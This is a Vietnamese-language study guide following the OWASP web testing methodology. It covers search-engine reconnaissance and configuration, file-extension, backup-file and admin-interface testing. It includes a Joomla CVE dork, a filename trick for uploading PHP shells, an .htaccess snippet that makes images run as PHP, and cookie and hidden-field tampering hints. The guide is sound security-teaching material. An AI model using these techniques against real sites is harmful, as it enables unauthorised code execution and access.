# OWASP

## Giới thiệu

OWASP là một tổ chức phi lợi nhuận cung cấp một framework đầy đủ về what, why, when, where và how cho việc đánh giá, kiểm tra các ứng dụng web.

## Web Application Security Testing

### 4.1     [Testing Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)

### 4.2		OTG-INFO (Information Gathering)

#### 4.2.1	OTG-INFO-001 (Conduct Search Engine Discovery and Reconnaissance for Information Leakage)

##### Summary

Thực hiện tìm kiếm thêm thông tin về ứng dụng web trên các search engine như Google, Baidu, Bing, Duck ...

Tìm kiếm dựa theo:

    domain name
    url
    title
    content

Với Google có thể tìm kiếm cùng với option:

    site: Chỉ hiện thông tin về site đó
    filetype: Chỉ hiện thông tin về filetype đó
    intitle: Chỉ hiện thông tin nếu trong title đó có giá trị cần tìm
    link: Chỉ hiện thông tin ở đâu có link đến đó
    inurl: Chỉ hiện thông tin nếu trong url có đó có giá trị cần tìm

##### Example report

Sử dụng inurl:index.php?option=com_users&view=registration (Lỗi của Joomla trước bản 3.6.4)

**CVE-2016-8870**: Thay đổi giá trị của component com_users để thực hiện phương thức register() của file user.php để tùy ý tạo tài khoản mà không cần authen.

![](img/4.2/4.2.1%20CVE%202016%208870.webp)

Thông tin liên quan: **CVE-2016-8869** và **CVE-2016-9081**

#### 4.2.2 




### 4.3 OTG-CONFIG (Configuration and Deployment Management Testing)

#### 4.3.1 OTG-CONFIG-001 (Test Network/Infrastructure Configuration)

##### Summary

Việc cấu hình mạng và cấu hình cơ sở hạ tầng là rất quan trọng để bảo vệ tính bảo mật của chính ứng dụng đó. Nếu các yếu tố như ứng dụng web, data-base servers hoặc unauthentication servers không được xây dựng và bảo mật đúng cách, thì chúng có thể gây ra rủi ro không mong muốn hoặc đưa ra các lỗ hổng mới có thể gây hại cho chính ứng dụng.

Ví dụ: lỗ hổng web server cho phép kẻ tấn công tiết lộ source code của chính ứng dụng đó. Thì attacker có thể sử dụng thông tin được tiết lộ trong source code để tạo payload mới bypass các "rào cản" để tiếp tục tấn công sâu hơn vào web server đó.

Cần thực hiện các bước sau để kiểm tra network/infrastructure configuration:

- Các elements khác nhau tạo nên infrastructure cần được xác định để hiểu cách chúng tương tác với ứng dụng web và cách chúng ảnh hưởng đến tính bảo mật của ứng dụng.

- Tất cả các elements của infrastructure cần được xem xét để đảm bảo rằng chúng không chứa bất kỳ lỗ hổng nào đã biết.

- Cần phải review các công cụ quản trị được sử dụng để duy trì tất cả các elements khác nhau.

- Các hệ thống xác thực, cần được review để đảm bảo rằng chúng phục vụ nhu cầu của ứng dụng và chúng không thể bị người dùng bên ngoài thao túng để tận dụng quyền truy cập.

- Một danh sách các port được xác định cần thiết cho ứng dụng nên được duy trì và giữ nó dưới change control.


Sau khi đã mapping các elements khác nhau tạo nên infrastructure (như Map Network và Application Architecture), có thể xem lại cấu hình của từng elements được thiết lập và kiểm tra mọi lỗ hổng đã biết.

**How to Test**

*Known Server Vulnerabilities*

Có thể sử dụng một số công cụ tự động sẽ gắn cờ các lỗ hổng dựa trên web server được truy cập, sẽ có rất nhiều yếu tố ảnh hưởng đến công cụ trên nên dẫn đến những trường hợp "dương tính giả" hoặc "âm tính giả". Đây chính là lý do vì sao việc kiểm tra các lỗ hổng sẽ đạt hiệu quả cao nhất khi được cung cấp đầy đủ thông tin nội bộ như tên, phiên bản,... về web server đó.

*Administrative tools*

Bất kỳ infrastructure web server nào cũng yêu cầu sự tồn tại của các công cụ quản trị để duy trì và cập nhật thông tin được sử dụng bởi ứng dụng. Sau khi đã mapping các giao diện quản trị được sử dụng để quản lý các elements khác nhau của kiến trúc, điều quan trọng là phải review chúng vì nếu kẻ tấn công giành được quyền truy cập vào bất kỳ phần nào trong số chúng thì kẻ đó có thể kiểm soát hoặc làm hỏng kiến trúc ứng dụng.

##### Example report

Sử dụng tool nikto để thu thập thông tin về web server.

![](img/4-3/4.3.1%20nikto%20tool.png)

Sử dụng searchsploit tool để thu thập thông tin về lỗ hổng với những elemets được web server sử dụng.

![](img/4-3/4.3.1%20searchsploit%20tool.png)



#### 4.3.2 OTG-CONFIG-002 (Test Application Platform Configuration)

##### Summary

Việc cấu hình đúng các elements đơn lẻ tạo nên kiến ​​trúc ứng dụng là rất quan trọng để ngăn ngừa các lỗi có thể ảnh hưởng đến tính bảo mật của toàn bộ architecture.

Xem xét và kiểm tra cấu hình là một nhiệm vụ quan trọng trong việc tạo và duy trì một architecture. Điều này là do nhiều hệ thống khác nhau thường sẽ được cung cấp các generic configurations (cấu hình chung, cấu hình mặc định) có thể không phù hợp với nhiệm vụ mà chúng sẽ thực hiện trên trang web cụ thể mà chúng được cài đặt.

Mặc dù cài đặt máy chủ ứng dụng và web thông thường sẽ chứa nhiều chức năng (như ứng dụng mẫu, tài liệu, trang thử nghiệm), những gì không cần thiết phải được xóa trước khi triển khai để tránh bị khai thác sau khi cài đặt.

**How to Test**

*Black Box Testing*

1. Các thư mục mẫu và các tệp mặc định

    Sử dụng các tool CGI Scanners bao gồm một danh sách chi tiết các tệp mặc định và các mẫu thư mục được cung cấp bởi các máy chủ ứng dụng hoặc web khác nhau và có thể là một cách nhanh chóng để xác định xem các tệp này có tồn tại hay không. Tuy nhiên, cách duy nhất để thực sự chắc chắn là thực hiện đánh giá đầy đủ nội dung của máy chủ web hoặc máy chủ ứng dụng và xác định xem chúng có liên quan đến chính ứng dụng đó hay không.

2. Các comment

    Việc xem xét comment nên được thực hiện để xác định xem có bất kỳ thông tin nào đang bị rò rỉ thông qua các comment hay không. Các comment được đưa vào source code có thể tiết lộ thông tin nội bộ mà kẻ tấn công không nên xem. Đôi khi, ngay cả source code còn chứa comment là cả một block code chức năng không còn cần thiết, nhưng comment này bị rò rỉ ra ngoài các trang HTML được trả lại cho người dùng ngoài ý muốn

3. Cấu hình hệ thống

    ***CIS-CAT cung cấp đánh giá chi tiết, nhanh chóng về sự phù hợp của các hệ thống mục tiêu với Điểm chuẩn CIS. CIS cũng cung cấp hướng dẫn củng cố cấu hình hệ thống được khuyến nghị bao gồm cơ sở dữ liệu, HĐH, máy chủ Web, trực quan hóa.***

*Gray Box Testing*

1. Đánh giá cấu hình
    
    Cấu hình máy chủ web hoặc máy chủ ứng dụng đóng một vai trò quan trọng trong việc bảo vệ nội dung của trang web và nó phải được xem xét cẩn thận để phát hiện các lỗi cấu hình phổ biến. Rõ ràng, cấu hình được đề xuất khác nhau tùy thuộc vào chính sách của trang web và chức năng sẽ được cung cấp bởi phần mềm máy chủ. Tuy nhiên, trong hầu hết các trường hợp, nên tuân thủ các nguyên tắc cấu hình (do nhà cung cấp phần mềm hoặc các bên bên ngoài cung cấp) để xác định xem máy chủ đã được bảo mật đúng cách chưa:

    - Chỉ kích hoạt các modules cần thiết cho máy chủ
    - Xử lý các lỗi 40* và 50* bằng các trang được tạo tùy chỉnh thay cho các trang lỗi mặc định, đặc biệt là phải đảm bảo rằng lỗi ứng dụng không rò rỉ source code.
    - Đảm bảo rằng phần mềm chỉ chạy với quyền tối thiểu trong hệ điều hành.
    - Đảm bảo máy chủ xử lý đúng cách khi gặp tình trạng quá tải hoặc DoS
    - Không bao giờ cấp quyền truy cập cho người không phải quản trị viên
    - Không bao giờ chia sẻ applicationHost.config, redirection.config và Administration.config trên mạng. Khi sử dụng Cấu hình dùng chung, hãy ưu tiên xuất applicationHost.config sang một vị trí khác
    - Hãy nhớ rằng tất cả người dùng có thể đọc các tệp .NET Framework machine.config và gốc web.config theo mặc định. Không lưu trữ thông tin nhạy cảm trong các tệp này nếu nó chỉ dành cho quản trị viên.
    - Sử dụng mật khẩu mạnh khi xuất các khóa mã hóa để sử dụng với shared -configuration.
    
2. Logging

    Log là một tài sản quan trọng để bảo mật application architecture, vì nó có thể được sử dụng để phát hiện các lỗi trong ứng dụng (người dùng liên tục cố truy xuất một tệp không thực sự tồn tại) cũng như các cuộc tấn công kéo dài từ những người dùng giả mạo.

    Trong cả hai trường hợp (server và application log), một số vấn đề cần được kiểm tra và phân tích dựa trên nội dung log:

    - Log có chứa thông tin nhạy cảm không?
    - Các log có được lưu trữ trong một máy chủ chuyên dụng không?
    - Việc sử dụng log có thể tạo ra điều kiện DoS không?
    - Log được xem như thế nào? Quản trị viên có thể sử dụng các đánh giá này để phát hiện các cuộc tấn công có chủ đích không?
    - Các bản sao lưu log được bảo quản như thế nào?
    - Log đang được ghi có được xác thực (độ dài tối thiểu/tối đa, ký tự, v.v.) trước khi được ghi không?

    ***Thông tin nhạy cảm trong log***

    - Thông tin debug
    - Stack traces
    - Usernames
    - Tên thành phần hệ thống
    - Địa chỉ IP nội bộ
    - Dữ liệu cá nhân như email, sđt,...
    - Dữ liệu kinh doanh

    Một danh sách rộng hơn các thông tin nhạy cảm là:

    - Source code ứng dụng
    - Session identification values
    - Access tokens
    - Dữ liệu cá nhân nhạy cảm và một số dạng thông tin nhận dạng cá nhân (PII)
    - Authentication passwords
    - Database connection strings
    - Encryption keys
    - Tài khoản ngân hàng hoặc dữ liệu chủ thẻ thanh toán
    - Dữ liệu có phân loại bảo mật cao hơn hệ thống ghi log được phép lưu trữ
    - Thông tin nhạy cảm về thương mại
    - Thông tin mà người dùng đã từ chối thu thập hoặc không đồng ý, ví dụ: việc thu thập thông tin khi sự đồng ý thu thập đã hết hạn

    Log location
    
    - Các máy chủ sẽ tạo log cục bộ về các hành động và lỗi của chúng. Nên giữ log ở một vị trí riêng biệt chứ không phải trong chính máy chủ web. Điều này trách việc attacker xóa log sau khi tấn công, cũng giúp tổng hợp log từ các nguồn khác nhau đề cập đến cùng một ứng dụng dễ dàng hơn và cũng giúp phân tích log dễ dàng hơn mà không ảnh hưởng đến chính máy chủ.

    Log storage

    - log có thể dẫn đến tình trạng DoS nếu chúng không được lưu trữ đúng cách. Bất kỳ kẻ tấn công nào có đủ tài nguyên đều có thể tạo ra đủ số lượng yêu cầu sẽ lấp đầy không gian được phân bổ cho các tệp log, nếu chúng không bị ngăn chặn cụ thể. Tuy nhiên, nếu máy chủ không được cấu hình đúng cách, các tệp log sẽ được lưu trữ trong cùng một phân vùng đĩa như phân vùng được sử dụng cho phần mềm hệ điều hành hoặc chính ứng dụng đó. Điều này có nghĩa là nếu đĩa bị đầy hệ điều hành hoặc ứng dụng có thể bị lỗi vì không thể ghi trên đĩa.

    Log rotation

    - Hầu hết các máy chủ sẽ xoay vòng log để ngăn chúng lấp đầy hệ thống tệp mà chúng cư trú. Một số máy chủ có thể xoay log khi chúng đạt đến một kích thước nhất định. Nếu điều này xảy ra, phải đảm bảo rằng kẻ tấn công không thể buộc các bản ghi xoay để che giấu dấu vết của hắn.

    Log Access Control

    - Thông tin log không bao giờ được hiển thị cho người dùng cuối. Cần xác thực để có thể xem được dữ liệu log được cho phép xem.

    Log review

    - Việc xem log có thể được sử dụng nhiều hơn ngoài việc trích xuất số liệu thống kê sử dụng tệp trong máy chủ web, mà còn để xác định xem các cuộc tấn công có diễn ra tại máy chủ web hay không.

    ***Tổng kết***

    Để phân tích các cuộc tấn công máy chủ web, các tệp log lỗi của máy chủ cần được phân tích. Đánh giá nên tập trung vào:

    Thông báo lỗi 40x (không tìm thấy). Một lượng lớn trong số này từ cùng một nguồn có thể là dấu hiệu của một công cụ quét CGI đang được sử dụng để chống lại máy chủ web

    Thông báo 50x (lỗi máy chủ). Đây có thể là dấu hiệu cho thấy kẻ tấn công lạm dụng các phần của ứng dụng gây lỗi ngoài ý muốn. Ví dụ: các giai đoạn đầu tiên của cuộc tấn công SQL injection sẽ tạo ra các thông báo lỗi này khi truy vấn SQL không được xây dựng đúng cách và việc thực thi nó không thành công trên cơ sở dữ liệu phía sau.

    Số liệu thống kê hoặc phân tích log không được tạo hoặc lưu trữ trong cùng một máy chủ tạo log. Mặt khác, kẻ tấn công có thể, thông qua lỗ hổng máy chủ web hoặc cấu hình không đúng, có quyền truy cập vào chúng và lấy thông tin tương tự như sẽ được tiết lộ bởi chính các tệp log.

##### Example report

Không thay đổi các trang lỗi mặc định dẫn đến việc tiết lộ web server và phiên bản sử dụng:

![](img/4-3/4.3.2%20error%20404.png)

Lưu log cùng nơi với application khiến cho khi application bị tấn công attacker có thể đọc, sửa, xóa log:

![](img/4-3/4.3.2%20cat%20log.png)


#### 4.3.3 OTG-CONFIG-003 (Test File Extensions Handling for Sensitive Information)

##### Summary

Phần mở rộng tệp thường được sử dụng trong các máy chủ web để dễ dàng xác định công nghệ, ngôn ngữ và plugin nào phải được sử dụng để đáp ứng yêu cầu web. Ngoài ra, cấu hình sai của máy chủ web có thể dễ dàng tiết lộ thông tin bí mật về thông tin đăng nhập truy cập.

**How to Test**

*Forced browsing*

1. Gửi các yêu cầu http[s] liên quan đến các extension khác nhau và xác minh cách chúng được xử lý. Việc xác minh phải dựa trên cơ sở từng thư mục web. Xác minh các thư mục cho phép thực thi tập lệnh. Các thư mục máy chủ web có thể được xác định bằng trình quét lỗ hổng, tìm kiếm sự hiện diện của các thư mục nổi tiếng. Ngoài ra, việc phản ánh cấu trúc trang web cho phép người kiểm tra xây dựng lại cây thư mục web do ứng dụng cung cấp.

    Các extensions sau đây sẽ không bao giờ được máy chủ web trả về vì chúng có liên quan đến các tệp có thể chứa thông tin nhạy cảm hoặc các tệp không có lý do để được cung cấp.

    - .asa
    - .inc

2. Các extensions sau đây có liên quan đến các tệp mà khi được truy cập, trình duyệt sẽ hiển thị hoặc tải xuống. Do đó, các tệp có các extension này phải được kiểm tra để xác minh rằng chúng thực sự được phục vụ và chúng không chứa thông tin nhạy cảm.

    - .zip, .tar, .gz, .tgz, .rar, ...: Files nén
    - .java: Không có lý do gì để cung cấp quyền truy cập vào source code Java
    - .txt: Text files
    - .pdf: PDF documents
    - .doc, .rtf, .xls, .ppt, ...: Office documents
    - .bak, .old và vài extensions khác biểu thị cho backup files (ví dụ: thêm ~ đối với tệp sao lưu Emacs)

3. Danh sách nêu trên chỉ nêu chi tiết một số ví dụ, vì có quá nhiều extension nên không thể nêu hết ở đây. Tham khảo http://filext.com/ để có thông tin đầy đủ hơn về các extension.

*File Upload*

1. Xử lý tệp cũ của Windows 8.3 đôi khi có thể được sử dụng để đánh bại các bộ lọc tải tệp lên
    ```php
    Ví dụ sử dụng:

    file.phtml được xử lý dưới dạng mã PHP

    FILE~1.PHT được trả về nhưng không được xử lý bởi trình xử lý ISAPI của PHP

    shell.phPWND có thể được upload

    SHELL~1.PHP sẽ được expand và trả về bởi OS shell, sau đó được xử lý bởi trình xử lý PHP ISAPI
    ```

*Gray Box testing*

Thực hiện kiểm tra white box đối với việc xử lý extension để kiểm tra cấu hình của máy chủ web hoặc máy chủ ứng dụng tham gia vào kiến trúc ứng dụng web và xác minh cách chúng được hướng dẫn để phục vụ các extension khác nhau.

*Tools*

Vulnerability scanners, chẳng hạn như Nessus và Nikto kiểm tra sự tồn tại của các thư mục web phổ biến. Chúng có thể cho phép người kiểm tra tải xuống cấu trúc trang web, điều này hữu ích khi cố gắng xác định cấu hình của các thư mục web và cách các extensions riêng lẻ được cung cấp. Các công cụ khác có thể được sử dụng cho mục đích này bao gồm:

    wget - http://www.gnu.org/software/wget
    curl - http://curl.haxx.se
    google for “web mirroring tools”.

##### Example report

Khi ứng dụng cho phép upload file ảnh như: png, jpg, jpeg, gif,... và không cho phép upload file như: php, phar, phtml,...

Nhưng lại sai khi cho phép upload cả file .htaccess, dựa vào đó attacker có thể chỉ định cách xử lý file ví dụ như xử lý file ảnh như là một file php:

```
<FilesMatch "\.(png|jpe?g|gif)$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

#### 4.3.4 OTG-CONFIG-004 (Review Old, Backup and Unreferenced Files for Sensitive Information)

##### Summary

Trong một máy chủ web, có thể tìm thấy các tệp tin không được sử dụng hoặc bị lãng quên, nhưng có thể được sử dụng để lấy thông tin quan trọng về cơ sở hạ tầng hoặc thông tin đăng nhập. Các tệp tin này có thể bao gồm các phiên bản cũ của các tệp tin đã được chỉnh sửa, các tệp tin được tải vào ngôn ngữ của lựa chọn và có thể được tải xuống dưới dạng mã nguồn, hoặc cả các bản sao lưu tự động hoặc thủ công dưới dạng file nén. Các tệp tin sao lưu cũng có thể được tạo tự động bởi hệ thống tệp tin bên dưới mà ứng dụng được lưu trữ trên đó, được gọi là "snapshots". Tất cả các tệp tin này có thể cấp quyền cho người kiểm thử truy cập vào các hoạt động bên trong, cổng sau, giao diện quản trị hoặc thậm chí là thông tin đăng nhập để kết nối đến giao diện quản trị hoặc máy chủ cơ sở dữ liệu.

Một nguồn quan trọng của lỗ hổng nằm trong các tệp tin không liên quan đến ứng dụng, nhưng được tạo ra do chỉnh sửa các tệp tin ứng dụng, hoặc sau khi tạo bản sao lưu trên đường đi, hoặc bằng cách để lại các tệp tin cũ hoặc các tệp tin không được sử dụng. Việc thực hiện chỉnh sửa tại chỗ hoặc các hành động quản trị khác trên máy chủ web sản xuất có thể vô tình để lại các bản sao lưu, được tạo tự động bởi trình soạn thảo khi chỉnh sửa tệp tin hoặc bởi người quản trị đang nén một tập hợp các tệp tin để tạo một bản sao lưu.

Do đó, các hoạt động này tạo ra các tệp tin không cần thiết cho ứng dụng và có thể được xử lý khác với tệp tin gốc bởi máy chủ web. Ví dụ, nếu chúng ta tạo một bản sao của login.asp với tên login.asp.old, chúng ta đang cho phép người dùng tải xuống mã nguồn của login.asp. Điều này là do login.asp.old sẽ được phục vụ như văn bản hoặc đơn giản, thay vì được thực thi

**Threats**

Tệp tin cũ, sao lưu và không được tham chiếu đến có các mối đe dọa đối với bảo mật của ứng dụng web:

- Tệp tin không được tham chiếu có thể tiết lộ thông tin nhạy cảm có thể dẫn đến một cuộc tấn công tập trung vào ứng dụng, ví dụ như các tệp tin bao gồm thông tin đăng nhập cơ sở dữ liệu, các tệp tin cấu hình chứa các tham chiếu đến nội dung ẩn khác, các đường dẫn tuyệt đối, v.v.
- Các trang không được tham chiếu có thể chứa các chức năng mạnh mẽ có thể được sử dụng để tấn công vào ứng dụng, ví dụ như một trang quản trị không được liên kết từ nội dung được xuất bản nhưng có thể được truy cập bởi bất kỳ người dùng nào biết cách tìm thấy nó.
- Các tệp tin cũ và sao lưu có thể chứa các lỗ hổng đã được khắc phục trong các phiên bản gần đây hơn, ví dụ như viewdoc.old.jsp có thể chứa một lỗ hổng điều hướng thư mục đã được khắc phục trong viewdoc.jsp nhưng vẫn có thể bị khai thác bởi bất kỳ ai tìm thấy phiên bản cũ.
- Các tệp sao lưu có thể tiết lộ mã nguồn cho các trang được thiết kế để thực thi trên máy chủ, ví dụ như yêu cầu viewdoc.bak có thể trả lại mã nguồn cho viewdoc.jsp, có thể được xem xét để tìm lỗ hổng khó tìm bằng cách yêu cầu mù đến trang thực thi.
- Các bản sao lưu của toàn bộ các tệp trong hay ngoài thư mục gốc ứng dụng cũng có thể chứa các thông tin nhạy cảm, cho phép kẻ tấn công liệt kê nhanh chóng toàn bộ ứng dụng, bao gồm các trang không được tham chiếu, mã nguồn, tệp tin bao gồm, v.v.

**How to Test**

*Black Box Testing*

1. Suy luận quy tắc đặt tên:

    Ví dụ: nếu tìm thấy trang viewuser.asp, thì hãy tìm thêm edituser.asp, adduser.asp và deleteuser.asp. Nếu tìm thấy thư mục /app/user, hãy tìm cả /app/admin và /app/manager.

2. Tìm các tính năng bị ẩn:

    For example:

    Lập trình viên comments source code và để lộ tính bị ẩn đi:
    ```html
    <!-- <A HREF="uploadfile.jsp">Upload a document to the server</A> -->
    <!-- Link removed while bugs in uploadfile.jsp are fixed          --> 
    ```

    JavaScript để lộ link đến file:
    ```javascript
    var adminUser=false;
    :
    if (adminUser) menu.add (new menuItem ("Maintain users", "/admin/useradmin.jsp")); 
    ```
    HTML chứa submit element bị comment, attacker có thể enable và sử dụng element nó:
    ```html
    <FORM action="forgotPassword.jsp" method="post">
        <INPUT type="hidden" name="userID" value="123">
        <!-- <INPUT type="submit" value="Forgot Password"> -->
    </FORM> 
    ```
    Lộ đường dẫn đến file /robots.txt (cái mà được cung cấp web robots):
    ```request
    User-agent: *
    Disallow: /Admin
    Disallow: /uploads
    Disallow: /backup
    Disallow: /~jbloggs
    Disallow: /include
    ```

3. Blind guessing:

    Tùy thuộc vào máy chủ,method GET có thể được thay thế bằng method HEAD để có kết quả nhanh hơn. Mã phản hồi 200 (OK) thường chỉ ra rằng tài nguyên hợp lệ đã được tìm thấy (miễn là máy chủ không chỉnh sửa trang "Not Found" mặc định bằng trang sử dụng mã 200). Nhưng cũng hãy để ý 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) và 500 (Internal error), những lỗi này cũng có thể cho biết các tài nguyên hoặc thư mục đáng để điều tra thêm.

    Xác định các extension được sử dụng trong các phạm vi đã biết của ứng dụng (ví dụ: jsp, aspx, html) và sử dụng danh sách tên file cơ bản được nối với mỗi extension.
    Đối với mỗi tệp được xác định thông qua các kỹ thuật liệt kê khác, hãy tạo một danh sách từ tùy chỉnh bắt nguồn từ tên tệp đó nối với các extension sau (bao gồm ~, bak, txt, src, dev, old, inc, orig, copy, tmp, v.v.)

4. Thông tin thu được thông qua lỗ hổng máy chủ và cấu hình sai:

    Khi mà một máy chủ được cấu hình sai có thể dẫn đến tiết lộ các trang không được cho phép.

5. Sử dụng thông tin có sẵn công khai:

    Nội dung không được tham chiếu từ bên trong ứng dụng đích mà có thể được liên kết tới bởi các trang web của bên thứ ba. Ví dụ: một ứng dụng xử lý thanh toán trực tuyến thay mặt cho thương nhân bên thứ ba có thể chứa nhiều chức năng riêng biệt mà (thông thường) chỉ có thể tìm thấy bằng cách theo các liên kết trong trang web của khách hàng.

6. Bỏ qua bộ lọc đen (blacklist filters):

    Được xây dựng dựa trên biểu thức chính quy, người kiểm thử đôi khi có thể tận dụng các tính năng mở rộng tên tập tin của hệ điều hành để đánh lừa ứng dụng hoặc máy chủ web. Điều này có thể xảy ra khi có sự khác biệt trong cách xử lý tên tập tin bởi ứng dụng, máy chủ web và hệ điều hành.

    Ví dụ, trên Windows, khi tên đường dẫn chứa khoảng trắng như "c:\program files", hệ thống có thể tạo ra một tên tập tin ngắn hơn có dạng "C:\PROGRA~1". Người kiểm thử có thể khai thác tính năng này để tránh bị chặn bởi bộ lọc tên tập tin.

    ```
    - Xóa các ký tự không tương thích
    – Chuyển đổi dấu cách thành dấu gạch dưới
    - Lấy sáu ký tự đầu tiên của tên cơ sở
    – Thêm “~<chữ số>” dùng để phân biệt các tệp có tên sử dụng sáu ký tự đầu giống nhau
    - Quy ước này thay đổi sau 3 lần trùng tên đầu tiên
    – Cắt phần mở rộng tệp thành ba ký tự
    - Viết hoa tất cả các ký tự
    ```

    Với các bước này, có thể đổi tên tệp tin theo quy ước cụ thể và giúp cho quản lý tệp tin trở nên dễ dàng hơn.


**Gray Box Testing**

Gray box testing trên các tệp tin cũ và sao lưu đòi hỏi phải xem xét các tệp tin nằm trong các thư mục thuộc tập các thư mục web được phục vụ bởi máy chủ web của cơ sở hạ tầng ứng dụng web. Việc kiểm tra lý thuyết nên được thực hiện bằng tay để đảm bảo chính xác. Tuy nhiên, trong hầu hết các trường hợp, các bản sao của tệp tin hoặc các tệp tin sao lưu thường được tạo ra bằng cách sử dụng các quy ước đặt tên giống nhau, việc tìm kiếm có thể dễ dàng được tạo ra bằng kịch bản. Một chiến lược tốt là lên lịch định kỳ cho một nhiệm vụ kiểm tra các tệp tin có extension có thể xác định chúng là các tệp tin sao chép hoặc sao lưu, và thực hiện kiểm tra thủ công.

**Tools**

Các công cụ đánh giá lỗ hổng thường bao gồm kiểm tra để phát hiện các thư mục web có tên chuẩn (như "admin", "test", "backup", v.v.), và báo cáo bất kỳ thư mục web nào cho phép chỉ mục. Nếu bạn không thể có bất kỳ danh sách thư mục nào, bạn nên thử kiểm tra các phần mở rộng sao lưu có thể có. Kiểm tra ví dụ như Nessus (http://www.nessus.org), Nikto2 (http://www.cirt.net/code/nikto.shtml) hoặc phiên bản mới của nó là Wikto (http://www.sensepost.com/research/wikto/), cũng hỗ trợ các chiến lược tấn công Google hacking.

Công cụ web spider: wget (http://www.gnu.org/software/wget/, http://www.interlog.com/~tcharron/wgetwin.html); Sam Spade (http://www.samspade.org); Spike proxy bao gồm chức năng web site crawler (http://www.immunitysec.com/spikeproxy.html); Xenu (http://home.snafu.de/tilman/xenulink.html); curl (http://curl.haxx.se). Một số trong số đó cũng được bao gồm trong các bản phân phối Linux tiêu chuẩn.

**Remediation**

Để đảm bảo một biện pháp bảo vệ hiệu quả, kiểm thử nên được kết hợp với một chính sách bảo mật rõ ràng cấm các hành vi nguy hiểm, như:

1. Chỉnh sửa tệp trực tiếp trên hệ thống tệp máy chủ web hoặc máy chủ ứng dụng. Đây là một thói quen tồi tệ đặc biệt, vì nó có thể không cố ý tạo ra các tệp sao lưu. Nếu tuyệt đối cần phải chỉnh sửa các tệp trên một hệ thống sản xuất, hãy đảm bảo rằng bạn không để lại bất cứ điều gì không được dự định rõ ràng.

2. Kiểm tra kỹ bất kỳ hoạt động nào được thực hiện trên các hệ thống tệp mà máy chủ web tiếp cận được, chẳng hạn như các hoạt động quản trị điểm nhận diện.

3. Chính sách quản lý cấu hình phù hợp phải giúp không để lại các tệp lỗi thời và không được tham chiếu.

4. Ứng dụng nên được thiết kế để không tạo ra các tệp được lưu trữ dưới cây thư mục máy chủ web được phục vụ bởi máy chủ web. Các tệp dữ liệu, tệp nhật ký, tệp cấu hình, v.v. phải được lưu trữ trong các thư mục không thể truy cập được bởi máy chủ web, để ngăn chặn khả năng tiết lộ thông tin.

5. Các snapshots hệ thống không được phép truy cập thông qua web. Định cấu hình máy chủ web của bạn để từ chối quyền truy cập vào các thư mục đó, ví dụ: trong apache, một chỉ thị vị trí như vậy sẽ được sử dụng:

    ```
    <Location ~ ".snapshot">
        Order deny,allow
        Deny from all
    </Location>
    ```

##### Example report

Phát hiện tiết lộ tệp sao lưu trong FortiOS 7.0.x và 7.2.x bởi Công cụ đánh giá lỗ hổng

Điều này đã được xác nhận là phản hồi dương tính giả vì máy chủ web FortiOS sẽ trả lời yêu cầu HTTP đường dẫn không hợp lệ với lỗi HTTP 404:

![](img/4-3/4.3.3%20error%20404.png)

Attacker cũng có thể thử tải xuống tệp bằng cách sử dụng một công cụ bên ngoài như wget hoặc curl. Ví dụ:

```
> wget.exe -S --no-check-cert https://<FortiGate_IP>/.htaccess
```

![](img/4-3/4.3.3%20wget.png)

Lệnh trên sẽ tải xuống tệp .htaccess vào thư mục nơi lệnh này được chạy. Giải nén file đã tải về và có thể xem lại nội dung trong file đã giải nén.

Xem tệp và xác nhận rằng tệp do FortiGate cung cấp chỉ là một tệp index.html được nén bằng gzip chuyển hướng đến trang đăng nhập qua javascript.

![](img/4-3/4.3.3%20downloaded%20file.png)

Điều này đã được xác nhận là phát hiện false positive trên FortiOS 7.0.x và 7.2.x.




#### 4.3.5 OTG-CONFIG-005 (Enumerate Infrastructure and Application Admin Interfaces)

##### Summary

Giao diện quản trị viên có thể có mặt trong ứng dụng hoặc trên máy chủ ứng dụng để cho phép một số người dùng nhất định thực hiện các hoạt động đặc quyền trên trang web. Việc test nên được thực hiện để tìm hiểu xem liệu chức năng đặc quyền này có thể được truy cập bởi người dùng hoặc truy cập trái phép hay không.

Một ứng dụng có thể yêu cầu giao diện quản trị viên để cho phép người dùng có đặc quyền truy cập chức năng có thể thực hiện các thay đổi đối với cách thức hoạt động của trang web. Những thay đổi như vậy có thể bao gồm:

- cấp phép tài khoản người dùng
- thiết kế và bố trí trang web
- thao tác dữ liệu
- thay đổi cấu hình

Trong nhiều trường hợp, các giao diện như vậy không có đủ an toàn để bảo vệ chúng khỏi bị truy cập trái phép. Việc test nên nhằm mục đích khám phá các giao diện quản trị viên này và truy cập chức năng dành cho người dùng đặc quyền.

**How to Test**

*Black Box Testing*

Phần sau đây mô tả các vectơ có thể được sử dụng để kiểm tra sự hiện diện của các giao diện quản trị. Các kỹ thuật này cũng có thể được sử dụng để kiểm tra các vấn đề liên quan bao gồm leo thang đặc quyền và được mô tả ở những nơi khác trong hướng dẫn này (ví dụ Testing for bypassing authorization schema (OTG-AUTHZ-002) và Testing for Insecure Direct Object References (OTG-AUTHZ-004)):

- Liệt kê thư mục và tập tin. Giao diện quản trị có thể có mặt nhưng không hiển thị cho người thử nghiệm. Cố gắng đoán đường dẫn của giao diện quản trị có thể đơn giản như yêu cầu: /admin hoặc /administrator, v.v.
- Có nhiều công cụ có sẵn để thực hiện brute force đối với tính năng của máy chủ.
- Comments và links trong source code. Nhiều trang web sử dụng source code chung được trả về cho tất cả người dùng trang web. Bằng cách kiểm tra tất cả các nguồn được gửi đến client, các links đến chức năng của quản trị viên có thể được phát hiện và cần được điều tra.
- Xem xét máy chủ và tài liệu ứng dụng. Nếu máy chủ ứng dụng hoặc ứng dụng được triển khai trong cấu hình mặc định của nó thì có thể truy cập vào giao diện quản trị bằng cách sử dụng thông tin được mô tả trong tài liệu trợ giúp hoặc cấu hình. 
- Thông tin có sẵn công khai. Nhiều ứng dụng như wordpress có giao diện quản trị mặc định.
- Cổng máy chủ thay thế. Giao diện quản trị có thể được nhìn thấy trên một cổng khác trên máy chủ so với ứng dụng chính. Ví dụ: giao diện Quản trị của Apache Tomcat thường có thể được nhìn thấy trên cổng 8080.
- Giả mạo tham số. Một tham số GET hoặc POST hoặc một biến cookie có thể được yêu cầu để kích hoạt chức năng quản trị viên. Manh mối cho điều này bao gồm sự hiện diện của các trường ẩn như:
```html
<input type="hidden" name="admin" value="no">
```

hoặc trong một cookie:
```header
Cookie: session_cookie; useradmin=0
```

*Gray Box Testing*

